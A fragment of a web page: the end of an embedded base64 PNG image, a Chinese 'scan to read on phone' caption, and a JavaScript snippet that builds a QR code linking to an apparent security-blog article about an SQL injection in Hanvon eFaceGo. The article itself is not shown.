i/9o7LwvEpBXPQY2qh52F/9zSaimB95aoPzgOV3nxg+0ENR9wEk5c8hULo6ybyT1HQ9wPHtYnWlVVu9K8bMp7Ii+Plr71n+9KUZdHIlyWuCH5SlJfVnOIzq1qY95nV17rqg3sAld789AHazRu5TVhekheGli9LfIawrwX2rxtydmIvyLWBgCeUPWjKK4NeC46rfuyT+AzBfcBY+8VPfWKwFkiq/VcS2J72aJvg7oQLQq8Vf5dtn/JlW1BewDVAYe1KL3PkV2DbDxjN3tp+pW8DSfLC155AG4imI8t2oJ9ieKF0Mvky+TJwDSC6M2B7OjryI4A+p16yj/SnAdxPPWTQx5Ubm4O1sOOoOYvBddForUcGrgGu/6nf3uyj3ZDf29e10tkJtIGAr03EuWZgHkhq+9YD+x99wMY1wYkD1gJNlbVCAId+0HPQx6oFc2M/5UYbNYkrpgbcN/EMa518cA3smDrYOSD0hm0gW3S9vPwEDgPRdGWznQHbk6u8DBxHKy4WLhi+IrgejKM2sTB18quFF1ZePrivcjJxMXAO1qiamaVHRej7zOrAmlonv2oPA5HgstedQHtzMVPKVsDTDF8R+lxqKkYP1iYHjmH/GZTcGYLrokn/xDMcNeAesK89ahILwfpZ72c5cA/Y1xxrYddcN2Q8nRfHbSDgKY37AfNAS+npkTXiwwG2nzGw40eq8aqLgXXRPIPgGjDWmq/0BfdJbe0XH6xJfIZnfVJ3pmkDifjC157ANZDXnv9h9YcDyfUSphr6K6ycLPmK4quBa4Emq3n5LXHiSCeLRAhs3xrlz0z62JgH18KO0QZTA9YkFkYDfS68EPqc6mTKxR4ORAWX/d4JHP5jCJ5iJjbbSnJg7ZkmOThqH/UB1wBp0/53AJzehlZQHHAN7Jg9RJZYCLsOiKTtQZoYsO1njFvR3Unu7m6ficG1wPVu7+3NPg5/GGZq2Sfs0xu5UZv8DD+jBa+ZGuHYU5wMrAWaRLwM2J5aMDbB3VFedne3T/myLRhexMug7wOOYf+jD8wNLboQ1prrZ0h3VK8P2kDAU4MeZ1vU0yKb5VYcuK/qYtGOcXhwDRCqe+JhfzLTQxix/GrhKwJbz3DgGPbeyaUXWBO+YjThwFrYMRowl1jYBpIGF772BNpvWZpOtbNtgScLPdYaWOeig7km+4juDKHvAXs81qWvEKyLBvpYPJiDHlUvkyYGvSb8Z/G6IZ89sR/WXwM5PeDfT7Zfe8eldSVHi2bFJy+MRv6zBs9f+/SfYdYD90t8hukz04w5OPaNZsTaL7lwicH9gOsPw9ubfbQf6rBPCZ7z87Vk0omF4B7yZTNNuKB01cJXrHn54HUAhT9qdR/yZ4sB3a/Rz2jUK3b9DJmd2Au5NpBM6Bl8Zr/pM2rBTxAwpg5v2gHb0wY7jkVZR7jKjfxZrD6xUQfex8jXeFU704D7wY5tILXg8l93AoeBwD4t6P3PbBNcO9bkCRImB9ZCj8nPEHot7PGoB+cqr/VllVv5cKwftWAN9Fh14Fw4rT/aYSARX/iaE7gG8ppzX676LQOB/ipqtfEqipOBtbCj+Gqprdzon2nGXGLY1wT7Y99ZnPogPF876wfr+m8ZyGzRi/vaCXzLQPLkVIT+KQDHVTNuObmRV5xcUNxoqxwc1442CNbAjmNuXG8Wp+YsN2pgX/NbBjJb/OK+dgKHgWR6M3y0BOyTjhbMpV/4ZzA1wujB/cAYXghHTvzMYK7VWrHUjXH4iqNmjKWFx2seBqLCy153Am0g4OnBY1xtN0/FDFMDe/9RB87NtNDnoqmYfmAtGKvmkQ+ugR1XNVlPCLseWJV0PLC9NVTJNpBKXv7rTuAayOvOfrry/wAAAP//7V+DWgAAAAZJREFUAwA1Z82h44qEJQAAAABJRU5ErkJggg==)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/hanvon-efacego-getAllRecord-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 